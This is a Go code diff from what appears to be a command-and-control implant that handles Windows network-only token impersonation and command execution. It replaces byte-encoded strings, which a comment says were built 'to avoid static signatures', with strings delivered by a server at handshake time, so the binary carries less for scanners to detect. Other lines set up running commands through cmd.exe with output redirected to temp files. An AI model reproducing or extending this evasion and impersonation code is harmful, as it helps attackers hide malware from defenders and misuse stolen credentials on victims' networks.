@@ -13,19 +13,69 @@ import (
 	"unsafe"
 )
 
-// Netonly file support strings (constructed to avoid static signatures)
-var (
-	nfProcGetDriveType = string([]byte{0x47, 0x65, 0x74, 0x44, 0x72, 0x69, 0x76, 0x65, 0x54, 0x79, 0x70, 0x65, 0x57})                                                                                                                                                                         // GetDriveTypeW
-	nfUncPrefix        = string([]byte{0x5c, 0x5c})                                                                                                                                                                                                                                           // \\
-	nfUncPrefixAlt     = string([]byte{0x2f, 0x2f})                                                                                                                                                                                                                                           // //
-	nfDriveRootSuffix  = string([]byte{0x3a, 0x5c})                                                                                                                                                                                                                                           // :\
-	nfFmtNetOnlyToken  = string([]byte{0x55, 0x73, 0x69, 0x6e, 0x67, 0x20, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x2d, 0x6f, 0x6e, 0x6c, 0x79, 0x20, 0x74, 0x6f, 0x6b, 0x65, 0x6e, 0x20, 0x27, 0x25, 0x73, 0x27, 0x20, 0x28, 0x25, 0x73, 0x5c, 0x25, 0x73, 0x29, 0x20, 0x66, 0x6f, 0x72, 0x3a, 0x20, 0x25, 0x73, 0x0a}) // Using network-only token '%s' (%s\%s) for: %s\n
+// NetOnlyFileSupportTemplate stores netonly file support template strings received from server
+type NetOnlyFileSupportTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
+
+// Netonly file support template indices - must match server's common.go
+const (
+	idxNfProcGetDriveType = 850 // GetDriveTypeW
+	idxNfUncPrefix        = 851 // \\
+	idxNfUncPrefixAlt     = 852 // //
+	idxNfDriveRootSuffix  = 853 // :\
+	idxNfFmtNetOnlyToken  = 854 // Using network-only token '%s' (%s\%s) for: %s\n
+
+	// Network token wrapper format strings (855-863)
+	idxNfFmtUsingNetToken   = 855 // Using network-only token: %s\n
+	idxNfFmtExecNetToken    = 856 // Executing with network-only token: %s\n
+	idxNfFmtProcComplete    = 857 // Process %d completed with exit code %d\n
+	idxNfFmtUser            = 858 //     User: %s\n\n
+	idxNfMsgCmdExecNetToken = 859 // Command executed with network-only token\n
+	idxNfCmdNet             = 860 // net
+	idxNfFmtCmdRedirect     = 861 // cmd.exe /c %s > "%s" 2>&1
+	idxNfFmtTempFile        = 862 // %s\netonly_output_%d.txt
+	idxNfPlaceholderUser    = 863 // DOMAIN\User
 )
 
-// Windows API for checking drive type
-var (
-	procGetDriveTypeW = modKernel32.NewProc(nfProcGetDriveType)
-)
+// Global netonly file support template storage
+var globalNetOnlyFileTpl *NetOnlyFileSupportTemplate
+
+// setNetOnlyFileSupportTemplate stores the netonly file support template
+func setNetOnlyFileSupportTemplate(tpl *NetOnlyFileSupportTemplate) {
+	globalNetOnlyFileTpl = tpl
+}
+
+// nfTpl safely retrieves a template string by index
+func nfTpl(idx int) string {
+	if globalNetOnlyFileTpl != nil && globalNetOnlyFileTpl.Templates != nil && idx < len(globalNetOnlyFileTpl.Templates) {
+		val := globalNetOnlyFileTpl.Templates[idx]
+		if val != "" {
+			return val
+		}
+	}
+	return ""
+}
+
+// getNfStr gets netonly file support string from template (no fallbacks - templates sent during handshake)
+func getNfStr(idx int) string {
+	return nfTpl(idx)
+}
+
+// Windows API for checking drive type - initialized lazily
+var procGetDriveTypeW *syscall.LazyProc
+
+func initProcGetDriveTypeW() {
+	if procGetDriveTypeW == nil {
+		procName := getNfStr(idxNfProcGetDriveType)
+		if procName != "" {
+			procGetDriveTypeW = modKernel32.NewProc(procName)
+		}
+	}
+}
 
 // Drive type constants
 const (
@@ -40,18 +90,32 @@ const (
 
 // IsNetworkPath checks if a path is a network path (UNC or mapped network drive)
 func IsNetworkPath(path string) bool {
+	// Get template strings
+	uncPrefix := getNfStr(idxNfUncPrefix)
+	uncPrefixAlt := getNfStr(idxNfUncPrefixAlt)
+	driveRootSuffix := getNfStr(idxNfDriveRootSuffix)
+
 	// Check for UNC paths
-	if strings.HasPrefix(path, nfUncPrefix) || strings.HasPrefix(path, nfUncPrefixAlt) {
+	if uncPrefix != "" && strings.HasPrefix(path, uncPrefix) {
+		return true
+	}
+	if uncPrefixAlt != "" && strings.HasPrefix(path, uncPrefixAlt) {
 		return true
 	}
 
 	// Check if it's a mapped network drive
-	if len(path) >= 2 && path[1] == ':' {
+	if len(path) >= 2 && path[1] == ':' && driveRootSuffix != "" {
 		driveLetter := strings.ToUpper(path[:1])
-		rootPath := driveLetter + nfDriveRootSuffix
+		rootPath := driveLetter + driveRootSuffix
 
 		rootPathPtr, err := syscall.UTF16PtrFromString(rootPath)
 		if err != nil {
+			return false
+		}
+
+		// Initialize proc lazily
+		initProcGetDriveTypeW()
+		if procGetDriveTypeW == nil {
 			return false
 		}
 
@@ -77,8 +141,12 @@ func PrepareNetworkOperation(path string) string {
 		defer globalTokenStore.mu.RUnlock()
 
 		if globalTokenStore.NetOnlyToken != "" {
+			fmtStr := getNfStr(idxNfFmtNetOnlyToken)
+			if fmtStr == "" {
+				return ""
+			}
 			metadata := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]
-			return fmt.Sprintf(nfFmtNetOnlyToken,
+			return fmt.Sprintf(fmtStr,
 				globalTokenStore.NetOnlyToken,
 				metadata.Domain,
 				metadata.User,
